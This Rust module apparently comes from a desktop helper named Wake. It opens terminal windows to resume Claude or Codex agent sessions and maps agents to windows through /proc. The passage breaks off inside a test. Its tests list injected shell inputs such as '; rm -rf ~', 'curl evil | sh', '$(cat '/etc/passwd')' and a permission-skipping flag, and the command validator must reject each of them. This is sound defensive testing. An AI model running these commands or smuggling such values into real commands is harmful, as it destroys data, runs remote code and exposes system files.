//! The desktop around Wake's agents: what each terminal app is called, and new windows for
//! resuming or starting an agent in the person's own default terminal app. Nothing here knows any
//! particular terminal app.
//!
//! Which window shows an agent is read from /proc (`procs::pty_masters`): the terminal app drawing
//! an agent's terminal holds the other end of its pty. Going there is the desktop link's job
//! (`look.rs`); Wayland lets no app raise another app's window, so where there is none Wake says
//! which window it is. Wake never sends a notification to navigate.
//!
//! New windows open in the default terminal app as the system names it: through
//! `xdg-terminal-exec` (the freedesktop default-terminal launcher), else `$TERMINAL`, else
//! `x-terminal-emulator` (Debian's). Opening one takes `dry_run`, which returns the exact command
//! it would run and runs nothing.
//!
//! Everything takes an injectable runner and a `/proc` root, so tests never touch the live desktop.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use crate::types::{ActionResult, Location};
use crate::util::{shell_join, shell_quote};

/// Qt 6's qdbus as Wake writes it in steps; the real runner runs [`qdbus_program`] for it.
pub const QDBUS: &str = "qdbus-qt6";
pub const GDBUS: &str = "gdbus";
pub const TIMEOUT: Duration = Duration::from_secs(2);
const LINEAGE: usize = 64;
const RESUME_PREFIXES: &[&str] = &["claude --resume ", "codex resume ", "claude attach "];
const FORBIDDEN: &[&str] = &["\n", "\r", ";", "&&", "|", "`", "$("];

/// Runs a program with no shell and no input: (exit code, stdout). 127 = not installed,
/// 124 = timed out, 126 = could not start.
pub type Runner = Arc<dyn Fn(&[String], Duration) -> (i32, String) + Send + Sync>;

/// Spawn in a process group of its own, collect output, and give up after `timeout`: then the whole
/// group gets SIGTERM (so git can remove its lock files), and SIGKILL half a second later. Output
/// is read only until the same deadline: a grandchild that keeps the pipe open (an ssh master, a
/// daemon) is left to it, never waited for. A program that is not installed is
/// `ErrorKind::NotFound`, a timeout `ErrorKind::TimedOut` (never matched by text, which depends on
/// the locale).
pub fn run_with_timeout(mut cmd: Command, timeout: Duration) -> std::io::Result<(i32, String, String)> {
    use std::os::unix::process::CommandExt;
    cmd.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).process_group(0);
    let mut child = cmd.spawn()?;
    let deadline = Instant::now() + timeout;
    // Each pipe is read in pieces as they come (an empty piece: the end), so what arrived before
    // the deadline is kept even when the pipe never closes.
    let (tx, rx) = std::sync::mpsc::channel::<(bool, Vec<u8>)>();
    read_pipe(child.stdout.take(), true, 16 * 1024 * 1024, tx.clone());
    read_pipe(child.stderr.take(), false, 1024 * 1024, tx);
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break st,
            Ok(None) if Instant::now() > deadline => {
                end_group(&mut child); // our own helper and what it started, never an agent
                return Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timed out"));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(5)),
            Err(e) => return Err(e),
        }
    };
    let (mut o, mut e, mut open) = (Vec::new(), Vec::new(), 2);
    let stop = deadline.max(Instant::now() + Duration::from_millis(100));
    while open > 0 {
        let left = stop.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break;
        }
        match rx.recv_timeout(left) {
            Ok((_, v)) if v.is_empty() => open -= 1,
            Ok((true, v)) => o.extend_from_slice(&v),
            Ok((false, v)) => e.extend_from_slice(&v),
            Err(_) => break,
        }
    }
    Ok((status.code().unwrap_or(1), String::from_utf8_lossy(&o).into_owned(), String::from_utf8_lossy(&e).into_owned()))
}

/// Reads `pipe` (at most `cap` bytes) on a thread of its own, sending each piece tagged `is_out`,
/// then an empty piece at the end.
fn read_pipe(pipe: Option<impl Read + Send + 'static>, is_out: bool, cap: u64, tx: std::sync::mpsc::Sender<(bool, Vec<u8>)>) {
    std::thread::spawn(move || {
        if let Some(p) = pipe {
            let mut p = p.take(cap);
            let mut buf = vec![0u8; 64 * 1024];
            while let Ok(n @ 1..) = p.read(&mut buf) {
                if tx.send((is_out, buf[..n].to_vec())).is_err() {
                    return;
                }
            }
        }
        let _ = tx.send((is_out, Vec::new()));
    });
}

/// SIGTERM to the process group `child` leads, SIGKILL to it half a second later if the child is
/// still there, then reap the child.
pub fn end_group(child: &mut std::process::Child) {
    let group = child.id() as libc::pid_t;
    // SAFETY: plain kill(2) on the group the child leads (spawned with process_group(0)); the child
    // is not reaped yet, so its pid, and so the group id, can't have been reused.
    unsafe { libc::kill(-group, libc::SIGTERM) };
    for _ in 0..50 {
        if !matches!(child.try_wait(), Ok(None)) {
            return;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    // SAFETY: as above; try_wait just said the child is still there.
    unsafe { libc::kill(-group, libc::SIGKILL) };
    let _ = child.wait();
}

/// A detached launch (`setsid -f …`, a new terminal window): only whether it started counts. Its
/// output belongs to the new window, which may keep it open for hours, so it is never read: a pipe
/// would keep Wake waiting until the window closed.
fn run_detached(mut cmd: Command, timeout: Duration) -> (i32, String) {
    cmd.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null());
    let Ok(mut child) = cmd.spawn() else { return (127, String::new()) };
    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(st)) => return (st.code().unwrap_or(1), String::new()),
            Ok(None) if start.elapsed() > timeout => {
                // Still starting: it is detached. Reaped whenever it ends, so it never lingers as a zombie.
                std::thread::spawn(move || child.wait());
                return (0, String::new());
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(5)),
            Err(_) => return (126, String::new()),
        }
    }
}

/// Qt 6's qdbus here: `qdbus-qt6` (Fedora, Arch), else `qdbus6` (Debian and Ubuntu name it so).
/// Never Qt 5's `qdbus`. Looked up on PATH once; `QDBUS` when neither is there.
pub fn qdbus_program() -> &'static str {
    static FOUND: std::sync::OnceLock<&'static str> = std::sync::OnceLock::new();
    FOUND.get_or_init(|| {
        let dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
        [QDBUS, "qdbus6"].into_iter().find(|n| dirs.iter().any(|d| d.join(n).is_file())).unwrap_or(QDBUS)
    })
}

pub fn default_runner() -> Runner {
    Arc::new(|argv: &[String], timeout: Duration| {
        let Some((prog, args)) = argv.split_first() else { return (126, String::new()) };
        let prog = if prog == QDBUS { qdbus_program() } else { prog.as_str() };
        let mut cmd = Command::new(prog);
        cmd.args(args);
        if prog == "setsid" {
            return run_detached(cmd, timeout);
        }
        match run_with_timeout(cmd, timeout) {
            Ok((code, out, _)) => (code, out),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => (127, String::new()),
            Err(e) if e.kind() == std::io::ErrorKind::TimedOut => (124, String::new()),
            Err(_) => (126, String::new()),
        }
    })
}

/// None when `command` is a resume command safe to type into a terminal, else why not.
pub fn check_command(command: Option<&str>) -> Option<String> {
    let Some(command) = command.filter(|c| !c.trim().is_empty()) else {
        return Some("There is no resume command for this session.".into());
    };
    for bad in FORBIDDEN {
        if command.contains(bad) {
            let shown = if *bad == "\n" || *bad == "\r" { "a line break".to_string() } else { format!("'{bad}'") };
            return Some(format!("Refused to type this command because it contains {shown}."));
        }
    }
    let Some(prefix) = RESUME_PREFIXES.iter().find(|p| command.starts_with(*p)) else {
        return Some("Refused to type this command: it must start with 'claude --resume ', 'claude attach ' or 'codex resume '.".into());
    };
    if !plain_id(&command[prefix.len()..]) {
        return Some("Refused to type this command: only a session id may follow.".into());
    }
    None
}

/// A session or job id as the agents write them: 1 to 80 letters, digits, `-` and `_`.
pub fn plain_id(id: &str) -> bool {
    (1..=80).contains(&id.len()) && id.bytes().all(|c| c.is_ascii_alphanumeric() || c == b'-' || c == b'_')
}

/// The parent pid from a /proc/<pid>/stat line, counting fields after the last ')'.
pub fn parent_of(stat: &str) -> Option<u32> {
    let end = stat.rfind(')')?;
    stat[end + 1..].split_whitespace().nth(1)?.parse().ok()
}

/// The nearest folder at or above `path` holding `.git`, with `.claude/worktrees/<name>` folded
/// back to its repo. Only looks. Falls back to `path` itself.
pub fn project_root(path: &str) -> String {
    let mut path = crate::store::lexical(Path::new(path)).to_string_lossy().into_owned();
    let marker = "/.claude/worktrees/";
    if let Some(i) = format!("{path}/").find(marker) {
        path = if i == 0 { "/".into() } else { path[..i].to_string() };
    }
    let mut probe = PathBuf::from(&path);
    loop {
        if probe.join(".git").exists() {
            return probe.to_string_lossy().into_owned();
        }
        if !probe.pop() {
            return path;
        }
    }
}

/// An agent process to place in a window.
#[derive(Debug, Clone, PartialEq)]
pub struct Placee {
    pub pid: u32,
    /// Who the window is credited to: the session pid for an attach client whose session is
    /// known, else `pid` itself.
    pub owner: u32,
}

pub struct Desktop {
    run: Runner,
    proc: PathBuf,
    /// Path to systemd-run (or empty). Unused since navigation stopped sending notifications; kept
    /// so the configuration keeps its shape.
    #[allow(dead_code)]
    systemd_run: String,
    /// How to open the default terminal app with a command: the launcher and its arguments before
    /// the command. None when the system names none.
    launcher: Option<Vec<String>>,
    /// Terminal apps' names by pid (see `app_name`), read once each.
    names: Mutex<std::collections::HashMap<u32, Option<String>>>,
}

pub(crate) fn which(name: &str) -> Option<String> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|d| d.join(name)).find(|p| p.is_file()).map(|p| p.to_string_lossy().into_owned())
}

/// How this system opens its default terminal app with a command: `xdg-terminal-exec`, else
/// `$TERMINAL -e`, else `x-terminal-emulator -e`. None when it names none.
pub fn terminal_launcher() -> Option<Vec<String>> {
    if let Some(x) = which("xdg-terminal-exec") {
        return Some(vec![x]);
    }
    let named = std::env::var("TERMINAL").ok().filter(|t| !t.trim().is_empty()).and_then(|t| if t.starts_with('/') { Path::new(&t).is_file().then_some(t) } else { which(&t) });
    named.or_else(|| which("x-terminal-emulator")).map(|t| vec![t, "-e".into()])
}

impl Desktop {
    pub fn new(run: Runner, proc: &Path, systemd_run: Option<&str>) -> Desktop {
        Desktop {
            run,
            proc: proc.to_path_buf(),
            systemd_run: match systemd_run {
                Some(s) => s.into(),
                None => which("systemd-run").unwrap_or_default(),
            },
            launcher: terminal_launcher(),
            names: Mutex::new(std::collections::HashMap::new()),
        }
    }

    pub fn real() -> Desktop {
        Desktop::new(default_runner(), Path::new("/proc"), None)
    }

    /// The same, opening new windows with `launcher` (tests; None: the system names no terminal).
    pub fn with_launcher(mut self, launcher: Option<Vec<String>>) -> Desktop {
        self.launcher = launcher;
        self
    }

    /// How new windows are opened, for `wake doctor`.
    pub fn launcher(&self) -> Option<&[String]> {
        self.launcher.as_deref()
    }

    /// `pid`, its parent and so on up to (not including) init.
    pub fn lineage(&self, pid: u32) -> Vec<u32> {
        let mut chain = Vec::new();
        let mut next = Some(pid);
        while let Some(n) = next {
            if n <= 1 || chain.len() >= LINEAGE || chain.contains(&n) {
                break;
            }
            let Ok(stat) = std::fs::read_to_string(self.proc.join(n.to_string()).join("stat")) else { break };
            chain.push(n);
            next = parent_of(&stat);
        }
        chain
    }

    /// The window of terminal app `pid`, named as its desktop entry names the app.
    pub fn window(&self, pid: u32) -> Location {
        let mut names = self.names.lock().unwrap_or_else(|e| e.into_inner());
        if names.len() > 256 {
            names.clear();
        }
        let app = names.entry(pid).or_insert_with(|| app_name(&self.proc, pid)).clone();
        Location { pid, app }
    }

    /// Open a fresh window of the default terminal app in `cwd` running the resume command (and a
    /// shell after it, so the window stays). On failure the message carries the command to copy.
    pub fn reopen(&self, cwd: Option<&str>, resume_command: &str, dry_run: bool) -> ActionResult {
        if let Some(reason) = check_command(Some(resume_command)) {
            return ActionResult { ok: false, message: reason, steps: vec![] };
        }
        self.new_window_running(cwd, resume_command, "resume", dry_run)
    }

    /// Start an agent with a brief: a fresh terminal window in `cwd` running `command`, which must
    /// be the one `brief::command` makes for a file in `briefs` (checked again here).
    pub fn start_typed(&self, cwd: &str, command: &str, briefs: &Path, dry_run: bool) -> ActionResult {
        if let Some(reason) = crate::brief::check_command(command, briefs) {
            return ActionResult { ok: false, message: reason, steps: vec![] };
        }
        self.new_window_running(Some(cwd), command, "start the agent", dry_run)
    }

    /// A new window of the default terminal app in `cwd` that runs `command` (already checked) in
    /// the person's shell, then leaves that shell open when it ends. Nothing is typed into an
    /// existing terminal: a new process is started, detached from Wake (setsid), so closing Wake
    /// leaves it running.
    fn new_window_running(&self, cwd: Option<&str>, command: &str, to: &str, dry_run: bool) -> ActionResult {
        let fail = |m: String, steps: Vec<String>| ActionResult { ok: false, message: m, steps };
        let cwd = match cwd.filter(|c| Path::new(c).is_absolute() && Path::new(c).is_dir()) {
            Some(c) => c,
            None => {
                return fail(format!("The folder {} is no longer there. Copy the command and run it where you want: {command}", cwd.unwrap_or("(unknown)")), vec![]);
            }
        };
        let copy = format!("cd {} && {command}", shell_quote(cwd));
        let Some(launcher) = &self.launcher else {
            return fail(format!("Wake couldn't find your default terminal app (it asks xdg-terminal-exec, then $TERMINAL). Copy this into a terminal to {to}: {copy}"), vec![]);
        };
        let argv = window_argv(launcher, &command_path(), cwd, command, &login_shell());
        let steps = vec![shell_join(&argv)];
        let message = format!("Opened a new terminal window in {cwd} to {to}.");
        if dry_run {
            return ActionResult { ok: true, message: format!("Dry run. {message}"), steps };
        }
        let (code, out) = (self.run)(&argv, TIMEOUT);
        if code != 0 {
            let why = out.lines().last().unwrap_or("").trim().to_string();
            let why = if why.is_empty() { String::new() } else { format!(" ({why})") };
            return fail(format!("Your terminal app didn't open{why}. Copy this into a terminal to {to}: {copy}"), steps);
        }
        ActionResult { ok: true, message, steps }
    }
}

/// The name a terminal app goes by: its desktop entry's `Name`, as the app itself sets it. Found from
/// what the system records about the process, never from a list of apps: the app ID of the scope
/// the desktop started it in (`app-[<launcher>-]<id>-<n>.scope`, the convention desktops follow),
/// a Flatpak's own ID, or its program's name; then `<id>.desktop` where desktop entries live.
pub fn app_name(proc: &Path, pid: u32) -> Option<String> {
    app_name_in(proc, pid, &application_dirs())
}

/// `app_name`, looking for desktop entries in `dirs`.
pub fn app_name_in(proc: &Path, pid: u32, dirs: &[PathBuf]) -> Option<String> {
    let dir = proc.join(pid.to_string());
    let mut ids: Vec<String> = Vec::new();
    if let Ok(cg) = std::fs::read_to_string(dir.join("cgroup")) {
        for unit in cg.lines().flat_map(|l| l.rsplit('/')) {
            let Some(core) = unit.strip_prefix("app-").and_then(|u| u.strip_suffix(".scope").or_else(|| u.strip_suffix(".service"))) else { continue };
            let core = unescape_unit(core.split('@').next().unwrap_or(core));
            // The instance part the desktop adds ("-129090"): no dot, and a digit in it.
            let core = match core.rsplit_once('-') {
                Some((id, n)) if !n.contains('.') && n.chars().any(|c| c.is_ascii_digit()) => id.to_string(),
                _ => core,
            };
            // With the launcher's name in front ("flatpak-com.example.App"), or without.
            if let Some((_, id)) = core.split_once('-') {
                ids.push(id.to_string());
            }
            ids.push(core);
        }
    }
    if let Ok(info) = std::fs::read_to_string(dir.join("root/.flatpak-info"))
        && let Some(id) = info.lines().find_map(|l| l.strip_prefix("name="))
    {
        ids.insert(0, id.trim().to_string());
    }
    if let Ok(comm) = std::fs::read_to_string(dir.join("comm")) {
        ids.push(comm.trim().to_string());
    }
    ids.iter().filter(|id| !id.is_empty() && !id.contains('/')).find_map(|id| dirs.iter().find_map(|d| entry_name(&std::fs::read_to_string(d.join(format!("{id}.desktop"))).ok()?)))
}

/// `\x2d` and the like in a systemd unit name, back to the characters they stand for.
fn unescape_unit(s: &str) -> String {
    let mut out = String::new();
    let mut rest = s;
    while let Some(i) = rest.find("\\x") {
        out.push_str(&rest[..i]);
        match rest.get(i + 2..i + 4).and_then(|h| u8::from_str_radix(h, 16).ok()) {
            Some(b) => {
                out.push(b as char);
                rest = &rest[i + 4..];
            }
            None => {
                out.push_str("\\x");
                rest = &rest[i + 2..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// The folders desktop entries live in: `$XDG_DATA_HOME/applications`, then each of
/// `$XDG_DATA_DIRS` (Flatpak adds its exports there).
fn application_dirs() -> Vec<PathBuf> {
    let home = std::env::var_os("XDG_DATA_HOME").map(PathBuf::from).or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local/share")));
    let dirs = std::env::var("XDG_DATA_DIRS").ok().filter(|d| !d.is_empty()).unwrap_or_else(|| "/usr/local/share:/usr/share".into());
    home.into_iter().chain(dirs.split(':').filter(|d| !d.is_empty()).map(PathBuf::from)).map(|d| d.join("applications")).collect()
}

/// The plain `Name=` of a desktop entry's main section.
pub fn entry_name(text: &str) -> Option<String> {
    let mut main = false;
    for line in text.lines().map(str::trim) {
        if line.starts_with('[') {
            main = line == "[Desktop Entry]";
        } else if main && let Some(n) = line.strip_prefix("Name=") {
            return Some(n.trim().to_string()).filter(|n| !n.is_empty());
        }
    }
    None
}

/// The PATH a new window's command runs with: Wake's own (where it found `claude`), and the
/// person's `~/.local/bin` if that isn't in it. A terminal app from Flatpak runs commands on the
/// host with a PATH of its own, so the command can't rely on inheriting Wake's.
fn command_path() -> String {
    // An empty or relative entry would look in whatever folder the window starts in.
    let mut path = std::env::var("PATH").unwrap_or_default().split(':').filter(|d| d.starts_with('/')).collect::<Vec<_>>().join(":");
    if let Some(home) = std::env::var_os("HOME") {
        let bin = PathBuf::from(home).join(".local/bin");
        let bin = bin.to_string_lossy();
        if !path.split(':').any(|d| d == bin) {
            path = if path.is_empty() { bin.into_owned() } else { format!("{path}:{bin}") };
        }
    }
    path
}

/// The shell new windows run: the session's $SHELL (what a terminal app itself starts), else /bin/sh.
fn login_shell() -> String {
    std::env::var("SHELL").ok().filter(|s| s.starts_with('/') && Path::new(s).is_file()).unwrap_or_else(|| "/bin/sh".into())
}

/// `setsid -f <launcher> /bin/sh -c 'PATH=<path>; export PATH; cd <cwd> && <command>; exec <shell>
/// -i'`: a detached new window of the default terminal app that runs the command in its folder with
/// Wake's PATH, then stays open on the person's interactive shell. The command runs under a plain, non-interactive sh on purpose: an
/// interactive shell reads its rc file, and an rc file that hands over to another shell (`exec
/// zsh` in .bashrc is common) would swallow the command before it ran. Wake's own PATH (where
/// `claude` is found) is passed on.
pub fn window_argv(launcher: &[String], path: &str, cwd: &str, command: &str, shell: &str) -> Vec<String> {
    let script = format!("PATH={}; export PATH; cd {} && {command}; exec {} -i", shell_quote(path), shell_quote(cwd), shell_quote(shell));
    let mut argv: Vec<String> = vec!["setsid".into(), "-f".into()];
    argv.extend(launcher.iter().cloned());
    argv.extend(["/bin/sh".into(), "-c".into(), script]);
    argv
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fs;

    /// A runner that records every call and starts nothing. Answers `gdbus` like a desktop with no
    /// link to fly with, `setsid` (a new window) with success unless told to fail.
    #[derive(Clone, Default)]
    pub struct FakeBus {
        pub calls: Arc<Mutex<Vec<Vec<String>>>>,
        pub fail: Arc<Mutex<Vec<&'static str>>>,
    }

    impl FakeBus {
        pub fn new() -> FakeBus {
            FakeBus::default()
        }

        pub fn runner(&self) -> Runner {
            let me = self.clone();
            Arc::new(move |argv: &[String], _t: Duration| me.call(argv))
        }

        fn call(&self, argv: &[String]) -> (i32, String) {
            self.calls.lock().unwrap().push(argv.to_vec());
            if argv[0] == "setsid" {
                return if self.fail.lock().unwrap().contains(&"window") { (1, "could not connect to display".into()) } else { (0, String::new()) };
            }
            if argv[0] == GDBUS && argv.iter().any(|a| a == "org.freedesktop.DBus.NameHasOwner") {
                return (0, "(false,)\n".into());
            }
            (1, String::new())
        }

        /// The calls that would change the desktop (asking who is on the bus is only a read).
        pub fn writes(&self) -> Vec<Vec<String>> {
            self.calls.lock().unwrap().iter().filter(|c| (c[0] == "setsid" || c[0] == GDBUS) && !c.iter().any(|a| a == "org.freedesktop.DBus.NameHasOwner")).cloned().collect()
        }
    }

    pub struct TmpDir(pub PathBuf);
    impl TmpDir {
        pub fn new(tag: &str) -> TmpDir {
            static N: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            let p = std::env::temp_dir().join(format!("wake-rs-{tag}-{}-{}", std::process::id(), N.fetch_add(1, std::sync::atomic::Ordering::SeqCst)));
            let _ = fs::remove_dir_all(&p);
            fs::create_dir_all(&p).unwrap();
            TmpDir(fs::canonicalize(p).unwrap())
        }
    }
    impl Drop for TmpDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    pub fn launcher() -> Vec<String> {
        vec!["/usr/bin/xdg-terminal-exec".into()]
    }

    fn desk(bus: &FakeBus, proc: &Path) -> Desktop {
        Desktop::new(bus.runner(), proc, Some("")).with_launcher(Some(launcher()))
    }

    /// On this machine: opens one real window of the default terminal app, running a command that
    /// writes where it found `claude` to `WAKE_LAUNCH_MARK`, and says how long Wake waited.
    /// `WAKE_LAUNCH_MARK=<file> cargo test -p wake-core real_launch -- --ignored --nocapture`
    #[test]
    #[ignore]
    fn real_launch() {
        let mark = std::env::var("WAKE_LAUNCH_MARK").unwrap();
        let launcher = terminal_launcher().expect("a default terminal app");
        let argv = window_argv(&launcher, &command_path(), "/tmp", &format!("command -v claude > {}; exit", shell_quote(&mark)), &login_shell());
        let t = Instant::now();
        let r = default_runner()(&argv, TIMEOUT);
        println!("launched with {r:?} in {:?}", t.elapsed());
    }

    #[test]
    fn parent_of_handles_odd_names() {
        assert_eq!(parent_of("12 (a) b (c)) S 34 1"), Some(34));
        assert_eq!(parent_of("garbage"), None);
    }

    #[test]
    fn a_terminal_app_is_named_by_its_desktop_entry_never_a_list() {
        let tmp = TmpDir::new("appname");
        let proc = tmp.0.join("proc");
        let apps = tmp.0.join("share/applications");
        fs::create_dir_all(&apps).unwrap();
        fs::write(apps.join("org.example.Term.desktop"), "[Desktop Entry]\nName[de]=Terminal\nName=Example Term\nExec=term\n[Desktop Action new]\nName=New Window\n").unwrap();
        fs::write(apps.join("other.desktop"), "[Desktop Entry]\nName=Other\n").unwrap();
        // Started by the desktop in an app scope, by a launcher, or as a Flatpak; or not at all.
        for (pid, cgroup) in [
            (10, "0::/user.slice/app.slice/app-org.example.Term-129090.scope/main.scope\n"),
            (11, "0::/user.slice/app.slice/app-flatpak-org.example.Term-1862345564.scope\n"),
            (12, "0::/user.slice/app.slice/app-launcher-org.example.Term@4f2a.service\n"),
            (13, "0::/user.slice/session.scope\n"),
        ] {
            fs::create_dir_all(proc.join(format!("{pid}"))).unwrap();
            fs::write(proc.join(format!("{pid}/cgroup")), cgroup).unwrap();
            fs::write(proc.join(format!("{pid}/comm")), "other\n").unwrap();
        }
        fs::write(proc.join("13/comm"), "unknown\n").unwrap();
        let dirs = [tmp.0.join("none"), apps.clone()];
        assert_eq!(app_name_in(&proc, 10, &dirs).as_deref(), Some("Example Term"));
        assert_eq!(app_name_in(&proc, 11, &dirs).as_deref(), Some("Example Term"));
        assert_eq!(app_name_in(&proc, 12, &dirs).as_deref(), Some("Example Term"));
        assert_eq!(app_name_in(&proc, 13, &dirs), None, "no entry for it: no name");
        assert_eq!(unescape_unit("org.my\\x2dterm"), "org.my-term");
        assert_eq!(entry_name("[Desktop Action x]\nName=No\n"), None);
    }

    #[test]
    fn a_grandchild_holding_the_pipe_or_a_hung_child_never_holds_wake() {
        // The child exits at once; what it left behind keeps its output pipe open for 30 s.
        let t = Instant::now();
        let mut c = Command::new("sh");
        c.args(["-c", "sleep 30 & echo hi"]);
        let (code, out, _) = run_with_timeout(c, Duration::from_millis(800)).unwrap();
        assert_eq!((code, out.as_str()), (0, "hi\n"));
        assert!(t.elapsed() < Duration::from_secs(5), "{:?}", t.elapsed());
        // A hung child: the group is ended at the deadline, the grandchild with it.
        let mark = TmpDir::new("group");
        let pidfile = mark.0.join("pid");
        let mut c = Command::new("sh");
        c.args(["-c", &format!("sleep 30 & echo $! > {}; wait", shell_quote(&pidfile.to_string_lossy()))]);
        let t = Instant::now();
        let e = run_with_timeout(c, Duration::from_millis(300)).unwrap_err();
        assert_eq!(e.kind(), std::io::ErrorKind::TimedOut);
        assert!(t.elapsed() < Duration::from_secs(5), "{:?}", t.elapsed());
        let pid: u32 = std::fs::read_to_string(&pidfile).unwrap().trim().parse().unwrap();
        std::thread::sleep(Duration::from_millis(100));
        let gone = std::fs::read_to_string(format!("/proc/{pid}/stat")).map_or(true, |s| s.contains(") Z "));
        assert!(gone, "the grandchild was ended with its group");
    }

    #[test]
    fn command_safety() {
        assert_eq!(check_command(Some("claude --resume 8b1c4e7a-3f62-4d09-a5e8-0c7d2b9f6e31")), None);
        assert_eq!(check_command(Some("codex resume 0199a-abc")), None);
        assert_eq!(check_command(Some("claude attach b5a90d33")), None);
        for bad in [
            Some("claude --resume x\n"),
            Some("claude --resume x; rm -rf ~"),
            Some("claude --resume x && make"),
            Some("claude --resume x | sh"),
            Some("claude --resume `id`"),
            Some("claude --resume $(id)"),
            Some("rm -rf ~"),
            Some("claude --resumex"),
            Some("claude --resume "),
            Some("claude --resume x > f"),
            Some("claude --resume 'x'"),
            Some(""),
            None,
            Some("bash -c 'claude --resume x'"),
            Some("claude --resume x --dangerously-skip-permissions"),
            Some("claude --resume x "),
            Some("claude attach ../x"),
        ] {
            assert!(check_command(bad).is_some(), "{bad:?}");
        }
    }

    struct ReopenFx {
        tmp: TmpDir,
        repo: PathBuf,
        sub: PathBuf,
        proc: PathBuf,
        cmd: &'static str,
    }

    fn reopen_fx() -> ReopenFx {
        let tmp = TmpDir::new("reopen");
        let repo = tmp.0.join("Projects/invites");
        fs::create_dir_all(repo.join(".git")).unwrap();
        let sub = repo.join("app");
        fs::create_dir_all(&sub).unwrap();
        let proc = tmp.0.join("proc");
        fs::create_dir_all(&proc).unwrap();
        ReopenFx { repo, sub, proc, cmd: "claude --resume 8b1c4e7a-3f62-4d09-a5e8-0c7d2b9f6e31", tmp }
    }

    #[test]
    fn reopen_opens_a_fresh_window_of_the_default_terminal_that_runs_the_command_and_stays_open() {
        let f = reopen_fx();
        let bus = FakeBus::new();
        let d = desk(&bus, &f.proc);
        let sub = f.sub.to_string_lossy().to_string();
        let r = d.reopen(Some(&sub), f.cmd, true);
        assert!(r.ok, "{r:?}");
        let shell = login_shell();
        assert_eq!(r.steps, vec![shell_join(&window_argv(&launcher(), &command_path(), &sub, f.cmd, &shell))]);
        assert!(bus.writes().is_empty(), "a dry run starts nothing");
        // A real run starts exactly that one detached process.
        let r = d.reopen(Some(&sub), f.cmd, false);
        assert!(r.ok && r.message.contains("new terminal window"), "{r:?}");
        let w = bus.writes();
        assert_eq!(w.len(), 1);
        assert_eq!(w[0], window_argv(&launcher(), &command_path(), &sub, f.cmd, &shell));
    }

    #[test]
    fn the_window_runs_the_command_in_its_folder_then_keeps_a_shell() {
        let argv = window_argv(&launcher(), "/usr/bin:/home/x/.local/bin", "/home/x/Projects/a b", "claude --resume 1234", "/usr/bin/zsh");
        // The command runs under a non-interactive sh (no rc file can swallow it), then the
        // person's own shell takes the window.
        assert_eq!(&argv[..5], ["setsid", "-f", "/usr/bin/xdg-terminal-exec", "/bin/sh", "-c"]);
        assert_eq!(argv[5], "PATH=/usr/bin:/home/x/.local/bin; export PATH; cd '/home/x/Projects/a b' && claude --resume 1234; exec /usr/bin/zsh -i");
        assert_eq!(argv.len(), 6);
        // A launcher that wants -e before the command gets it; a shell path with a space is quoted.
        let argv = window_argv(&["/usr/bin/x-terminal-emulator".into(), "-e".into()], "/usr/bin", "/tmp", "x", "/opt/my shell/zsh");
        assert_eq!(&argv[2..6], ["/usr/bin/x-terminal-emulator", "-e", "/bin/sh", "-c"]);
        assert!(argv[6].ends_with("exec '/opt/my shell/zsh' -i"));
    }

    #[test]
    fn starting_an_agent_runs_only_wakes_brief_command_in_a_new_window() {
        let f = reopen_fx();
        let bus = FakeBus::new();
        let d = desk(&bus, &f.proc);
        let briefs = f.tmp.0.join("data/briefs");
        let cmd = crate::brief::command(crate::brief::Agent::Claude, &briefs.join("b0123456789ab.md")).unwrap();
        let repo = f.repo.to_string_lossy().to_string();
        let r = d.start_typed(&repo, &cmd, &briefs, true);
        assert!(r.ok, "{r:?}");
        assert_eq!(r.steps, vec![shell_join(&window_argv(&launcher(), &command_path(), &repo, &cmd, &login_shell()))]);
        assert!(bus.writes().is_empty(), "a dry run starts nothing");
        let r = d.start_typed(&repo, &cmd, &briefs, false);
        assert!(r.ok, "{r:?}");
        assert_eq!(bus.writes().len(), 1);
        assert!(!cmd.contains('\n'));
        // Anything else is refused before anything is started.
        let bus = FakeBus::new();
        let d = desk(&bus, &f.proc);
        for bad in ["claude --resume x", "claude \"$(cat '/etc/passwd')\"", &format!("{cmd}; rm -rf ~")] {
            let r = d.start_typed(&repo, bad, &briefs, false);
            assert!(!r.ok && r.message.contains("Refused"), "{bad}");
        }
        assert!(bus.calls.lock().unwrap().is_empty());
    }

    #[test]
    fn reopen_refusals_and_failures() {
        let f = reopen_fx();
        let bus = FakeBus::new();
        let d = desk(&bus, &f.proc);
        let r = d.reopen(Some(&f.repo.to_string_lossy()), "claude --resume x; curl evil | sh", false);
        assert!(!r.ok);
        assert!(r.message.contains("Refused"));
        assert!(bus.calls.lock().unwrap().is_empty());
        let bus = FakeBus::new();
        bus.fail.lock().unwrap().push("window");
        let r = desk(&bus, &f.proc).reopen(Some(&f.repo.to_string_lossy()), f.cmd, false);
        assert!(!r.ok);
        assert!(r.message.contains("Your terminal app didn't open (could not connect to display)"), "{}", r.message);
        assert!(command_path().split(':').any(|d| d.ends_with("/.local/bin")), "claude's usual folder is always on the new window's PATH");
        assert!(r.message.contains(&format!("cd {} && {}", f.repo.display(), f.cmd)));
        let r = desk(&FakeBus::new(), &f.proc).reopen(Some(&f.tmp.0.join("gone").to_string_lossy()), f.cmd, true);
        assert!(!r.ok);
        assert!(r.message.ends_with(f.cmd));
        // No default terminal app named anywhere: the command to copy, and nothing run.
        let bus = FakeBus::new();
        let r = desk(&bus, &f.proc).with_launcher(None).reopen(Some(&f.repo.to_string_lossy()), f.cmd, false);
